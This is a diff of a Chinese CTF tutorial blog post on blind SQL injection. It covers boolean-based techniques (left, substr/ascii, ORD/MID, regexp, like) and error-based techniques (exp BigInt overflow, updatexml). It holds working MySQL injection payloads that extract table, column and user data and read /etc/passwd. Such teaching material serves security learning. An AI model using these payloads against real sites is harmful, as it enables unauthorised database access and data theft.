@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-uk" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='&amp;lt;!&amp;ndash;more&amp;ndash;&amp;gt; SQL Injection: Blind injection 对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示的返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返'><title>SQL注入：盲注</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='SQL Injection: Blind injection 对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示地返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返回'><title>SQL注入：盲注</title>
 
 <link rel='canonical' href='https://ginkgo.org.cn/posts/sqli_blind_injection/'>
 
 <link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SQL注入：盲注'>
-<meta property='og:description' content='&amp;lt;!&amp;ndash;more&amp;ndash;&amp;gt; SQL Injection: Blind injection 对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示的返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返'>
+<meta property='og:description' content='SQL Injection: Blind injection 对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示地返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返回'>
 <meta property='og:url' content='https://ginkgo.org.cn/posts/sqli_blind_injection/'>
 <meta property='og:site_name' content='Under The Ginkgo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='SQLi' /><meta property='article:published_time' content='2022-03-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-20T22:13:17&#43;01:00'/>
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='SQLi' /><meta property='article:published_time' content='2022-03-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-09-29T15:15:42&#43;08:00'/>
 <meta name="twitter:title" content="SQL注入：盲注">
-<meta name="twitter:description" content="&amp;lt;!&amp;ndash;more&amp;ndash;&amp;gt; SQL Injection: Blind injection 对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示的返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返">
+<meta name="twitter:description" content="SQL Injection: Blind injection 对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示地返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返回">
     <link rel="shortcut icon" href="/img/favicon.ico" />
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
@@ -261,7 +261,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    9 minute read
+                    12 minute read
                 </time>
             </div>
         
@@ -275,147 +275,404 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <p>&lt;!&ndash;more&ndash;&gt;</p>
-<h2 id="sql-injection-blind-injection">SQL Injection: Blind injection</h2>
-<p>对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示的返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返回查询的内容，但是我们可以通过一些标志或者说信号（signal）来得知注入语句是否被执行</p>
-<h3 id="1-dot-布尔盲注">1. 布尔盲注</h3>
-<p>我们先来介绍布尔盲注，布尔Bool，意味着我们在将注入一些布尔逻辑判断，来查看页面是否发生变化来判断语句是否成功执行，比如：如果成功，则页面正常显示，否则就什么都不显示</p>
+    <h2 id="sql-injection-blind-injection">SQL Injection: Blind injection</h2>
+<p>对于之前的SQL注入，我们都是通过注入拼接查询语句，来显示地返回数据库，表，列的信息到页面对应的位置，而盲注的特点就在于页面不会返回任何查询到的内容，因此我们只能通过一些标志或者说信号（signal）来得知注入语句是否被执行，以及查询到的数据。</p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<p>布尔Bool，意味着我们在将注入一些布尔逻辑判断，根据逻辑判断的结构来触发页面发生变化，进而判断语句是否成功执行；</p>
+<p>例如：如果成功，则页面正常显示；否则就什么都不显示</p>
 <p>接下来我们来看一些由不同的函数组成的布尔判断</p>
 <h4 id="left">- <code>left()</code></h4>
-<p>通过left来截取字符，然后使用字母表进行逐个比较，如果等式成立，那么页面正常显示，如果失败，那么页面就无法正常显示，以此我们就可以推断字符串的内容</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and left(database(), 1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39; # database first char match
+<p>通过left来截取字符，然后使用字母表进行逐个比较，如果等式成立，那么页面正常显示;</p>
+<dl>
+<dt>Left()函数</dt>
+<dd><ul>
+<li>LEFT(str, len)</li>
+<li>从给定的字符串str中，返回从左开始的len个字符</li>
+<li>如果是是RIGHT就是从由开始截取</li>
+</ul>
+</dd>
+</dl>
+<p>如果失败，那么页面就无法正常显示，以此我们就可以推断字符串的内容；</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and left(database(), 1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39; # database first char match
 </span></span></span><span class="line"><span class="cl"><span class="s1">
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;se&#39;</span><span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="k">first</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">chars</span><span class="w"> </span><span class="k">match</span><span class="w">
-</span></span></span></code></pre></div><p>可以先通过length来判断长度，方便进行</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and length(database())=8%23 # length match
-</span></span></span></code></pre></div><h4 id="substr-ascii">- <code>substr()</code> <code>ascii()</code></h4>
-<p>同样是截取字符，使用substr方法，然后通过ascii转换成ascii码后进行比较</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">tables_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">101</span><span class="w">
-</span></span></span></code></pre></div><h4 id="ord-and-mid">- <code>ORD()</code> and <code>MID()</code></h4>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以先通过length来判断长度，方便进行了解最终需要获得几个字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and length(database())=8%23 # length match
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="substr-and-ascii">- <code>substr()</code> &amp; <code>ascii()</code></h4>
+<p>同样是截取字符，使用substr方法;</p>
+<p>然后通过ascii()方法将char转换成ascii码值(int)值之后进行判断与比较</p>
+<dl>
+<dt>substr()函数</dt>
+<dd><ul>
+<li>substr(obj，start，length)</li>
+<li>从给定的字符串/数值obj中，以start（从1开始增加）开始，截取length个字符</li>
+</ul>
+</dd>
+<dt>ascii()函数</dt>
+<dd><ul>
+<li>ASCII(str)</li>
+<li>返回字符串str最左面字符的ASCII码值；</li>
+<li>如果为空字符串，则返回0；如果为NULL，返回NULL</li>
+</ul>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">tables_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">101</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="ord-and-mid">- <code>ORD()</code> and <code>MID()</code></h4>
 <p>与substr()和ascii()的组合类似，也是通过MID逐个选取字符，然后使用ORD返回ASCII进行比较</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68 # match username&#39;</span><span class="n">s</span><span class="w"> </span><span class="k">first</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">IFNULL</span><span class="w">
-</span></span></span></code></pre></div><h4 id="regexp">- <code>regexp</code></h4>
+<dl>
+<dt>ORD(str)</dt>
+<dd><ul>
+<li>返回str字符串最左边的第一个字符的code
+<ul>
+<li>如果最左边的第一个字符为多字节字符（例如utf-8占3个字节），则结果使用公式计算：
+(1st byte code)+ (2nd byte code * 256)+ (3rd byte code * 256^2) ……</li>
+<li>如果是一个字节的字符，则返回该字符的ASCII码值，结果和ASCII(str)一致</li>
+</ul>
+</li>
+</ul>
+</dd>
+</dl>
+<figure><img src="/ox-hugo/2022-09-28_21-50-22_screenshot.png"
+         alt="Figure 1: ASCII 与 ORD 方法的区别" width="200px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted -->ASCII 与 ORD 方法的区别</p>
+        </figcaption>
+</figure>
+
+<dl>
+<dt>MID(str, pos. len)</dt>
+<dd><ul>
+<li>从pos开始，str中截取长度为len的substring</li>
+<li>其中pos从1开始，也可以为负数表示从末尾开始</li>
+</ul>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;and ORD(MID((select IFNULL(CAST(username as char), 0x20) from security.users order by id limit 0,1),1,1))=68 # match username&#39;</span><span class="n">s</span><span class="w"> </span><span class="k">first</span><span class="w"> </span><span class="n">record</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">IFNULL</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><dl>
+<dt>IFNULL()函数</dt>
+<dd><ul>
+<li>IFNULL(expression, alt_value)</li>
+<li>判断第一个表达式的结果是否为NULL，如果不是NULL则返回其结果；</li>
+<li>如果是NULL则返回 <code>alt_value</code> 的结果</li>
+</ul>
+</dd>
+</dl>
+<h4 id="regexp">- <code>regexp</code></h4>
 <p>这次是利用正则表达式来进行比较</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39; and table_name regexp &#39;</span><span class="o">^</span><span class="p">[</span><span class="n">a</span><span class="o">-</span><span class="n">z</span><span class="p">]</span><span class="s1">&#39; limit 0,1)-- -
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and 1=(select 1 from information_schema.columns where table_name=&#39;</span><span class="n">users</span><span class="s1">&#39; and table_name regexp &#39;</span><span class="o">^</span><span class="p">[</span><span class="n">a</span><span class="o">-</span><span class="n">z</span><span class="p">]</span><span class="s1">&#39; limit 0,1)-- -
 </span></span></span><span class="line"><span class="cl"><span class="s1">
 </span></span></span><span class="line"><span class="cl"><span class="s1">
 </span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="n">regexp</span><span class="w"> </span><span class="s1">&#39;^username&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="c1">-- -
-</span></span></span></code></pre></div><h4 id="like-匹配注入">- <code>like</code> 匹配注入</h4>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="like-匹配注入">- <code>like</code> 匹配注入</h4>
 <p>通过模糊匹配来进行比较</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;ro%&#39;</span><span class="w">
-</span></span></span></code></pre></div><ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;ro%&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
 <li>The percent sign (%) represents zero, one, or multiple characters</li>
 <li>The underscore sign (_) represents one, single character</li>
 </ul>
-<h3 id="2-dot-报错盲注">2. 报错盲注</h3>
+<h3 id="报错盲注">报错盲注</h3>
 <p>报错注入是将有价值的信息通过报错的方式显示输出。
 这里需要与普通的注入区分一下：</p>
 <ul>
 <li>普通的注入是将查询到的信息返回出来</li>
 <li>报错注入是构造特定的MYSQL函数语法错误，同时将所需要的信息拼接到错误返回信息中，然后再返回到页面上来</li>
 </ul>
-<p><a class="link" href="https://blog.sari3l.com/posts/9622f295/#/procedure-analyse"  target="_blank" rel="noopener"
-    >https://blog.sari3l.com/posts/9622f295/#/procedure-analyse</a></p>
-<figure><img src="/ox-hugo/2022-04-02_12-05-21_screenshot.png" width="700px"/>
+<figure><img src="/ox-hugo/2022-04-02_12-05-21_screenshot.png"
+         alt="Figure 2: 报错盲注总结" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted --><a class="link" href="https://blog.sari3l.com/posts/9622f295/#/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8B%E7%A5%9E%E5%A5%87%E7%9A%84%E9%97%AE%E9%A2%98"  target="_blank" rel="noopener"
+    >报错盲注总结</a></p>
+        </figcaption>
 </figure>
 
-<h4 id="bigint数据类型溢出报错注入">- BigInt数据类型溢出报错注入</h4>
+<h4 id="bigint数据类型溢出报错注入">BigInt数据类型溢出报错注入</h4>
 <p><a class="link" href="https://www.freebuf.com/articles/web/274019.html"  target="_blank" rel="noopener"
-    >https://www.freebuf.com/articles/web/274019.html</a></p>
+    >mysql注入入门之报错注入</a></p>
 <p>利用exp(int)函数，计算e^[int]的值，得到一个很大的数，目的是要造成&quot;DOUBLE value is out of range&quot;的错误
 只适用于， mysql版本5.5.5以上的版本</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and exp(~(select * from (select user())a))-- -
-</span></span></span></code></pre></div><p>1.先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a
-2.然后在查询select * from a 查询a，将结果集a全部查询出来
-3.查询完成，语句成功执行，返回值为0，将0按位取反（&rsquo;~&rsquo;）就会得到一个无符号的最大BIGINT值，从而使exp调用的时候报错</p>
+<dl>
+<dt>EXP(X)</dt>
+<dd><ul>
+<li>计算得到e^X的值</li>
+</ul>
+</dd>
+<dt>~ 符号</dt>
+<dd><ul>
+<li>按位取反</li>
+<li>00001001</li>
+<li>11110110</li>
+</ul>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and exp(~(select * from (select user())a))-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>1.先查询select user()这个语句的结果，然后将查询出来的数据作为一个结果集取名为a（临时表取名）；
+2.然后在查询select * from a 查询a，将结果集a全部查询出来；
+3.查询完成，语句成功执行，返回值为0，将0按位取反（&rsquo;~&rsquo;）就会得到一个 <code>无符号</code> 的最大BIGINT值，从而使exp调用的时候报错。</p>
 <p>获取表名信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>获取列名信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>获取列名对应的信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>读取文件</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">))</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>注意：对于所有的insert、update和delete语句DIOS查询也同样可以使用 除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入</p>
-<h4 id="参数格式错误">- 参数格式错误</h4>
-<p>参数格式错误旨在使用特殊的函数，这些函数需要参数满足一定的条件，否则将会报出错误的信息，我们通过将需要的内容查询之后拼接到报出的错误信息中来实现报错注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取列名信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取列名对应的信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">load_file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">))</span><span class="n">a</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意：对于所有的insert、update和delete语句DIOS查询也同样可以使用 除了exp()函数之外，pow()之类的相似函数同样可以利用BigInt数据溢出的方式进行报错注入</p>
+<h4 id="参数格式错误">参数格式错误</h4>
+<p>参数格式错误旨在使用特殊的函数，这些函数需要参数满足一定的条件，否则将会报出错误的信息；</p>
+<p>我们通过将需要的内容查询之后拼接到报出的错误信息中来实现报错注入：</p>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p>(1) <code>updatexml()</code></p>
+<p><code>updatexml()</code></p>
 <p><code>updatexml()</code> 函数利用的就是mysql函数参数格式错误进行报错注入</p>
-<p><code>updatexml()</code> 函数语法：updatexml(XML_document,Xpath_string,new_value);</p>
-<p>函数语法解析：</p>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串，例如：boostore, bookstore/book, <em>/book, bookstore//book, //@lang, /[/@\d]</em></p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
-<p>适用版本是： <code>Mysql 5.1.5+</code></p>
-<p>利用方式：在执行两个函数时，如果出现xml文件路径错误，就会产生报错 那么我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错</p>
+<p>updatexml(XML_document,Xpath_string,new_value)
+: -   XML_document:是字符串String格式，为XML文档对象名称
+-   Xpath_string:Xpath格式的字符串，例如：boostore, bookstore/book, <em>/book, bookstore//book, //@lang, /[/@\d]</em>
+-   new_value:string格式，替换查找到的符合条件的数据
+-   作用是改变文档中符合条件的节点的值
+-   适用版本是： <code>Mysql 5.1.5+</code></p>
+<p>利用方式：</p>
+<p>在执行两个函数时，如果出现xml文件路径错误，就会产生报错；</p>
+<p>那么我们就需要构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数，mysql就会报错：</p>
 <p>查询当前数据库的用户信息以及数据库版本信息</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -
-</span></span></span></code></pre></div><p>根据上面对于Xpath_string的定义我们可以得知，当使用类似0x7e=&rsquo;~&lsquo;之类的额外字符的时候，会被认定为非Xpath，就会产生报错</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据上面对于Xpath_string的定义我们可以得知，当使用类似 0x7e=&rsquo;~&rsquo; 之类的额外字符的时候，会被认定为非Xpath，就会产生报错</p>
